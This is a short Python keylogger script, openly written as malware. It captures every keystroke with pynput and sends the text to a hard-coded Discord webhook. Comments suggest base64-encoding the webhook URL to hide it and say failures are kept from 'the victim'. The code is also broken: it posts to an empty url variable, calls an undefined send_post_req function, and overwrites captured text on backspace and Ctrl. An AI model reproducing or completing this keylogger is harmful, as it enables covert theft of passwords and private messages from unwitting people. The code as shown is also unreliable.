# Logs the keys pressed and sends them to a Discord webhook every 10 seconds (can change the frecuency if needed).

import requests, json, threading; from pynput import keyboard

# Optionally you can convert your webhook URL to base64 and decode it with this.
# import base64, urllib.parse
# encoded_string = ""
# urllib.parse.unquote(base64.b64decode(encoded_string).decode('utf-8'))

text = ""
encoded_url = "https://discord.com/api/webhooks/1234567890123456789/Uor9iapdJXRqTJAO_3pnJbB3v7twFkslhM-Ufxp5L_iBrS8alx7eB-9roTrBc8Rs1EYF"
url = ""
time_interval = 10 # Seconds

def donothing():
    return

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = "[BACKSPACE]" # text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        text = "[CONTROL]"
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    try:
        response = requests.post(url, json={"content" : text})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        donothing() # Couldn't complete request! Don't tell the victim!
    finally:
        listener.join()
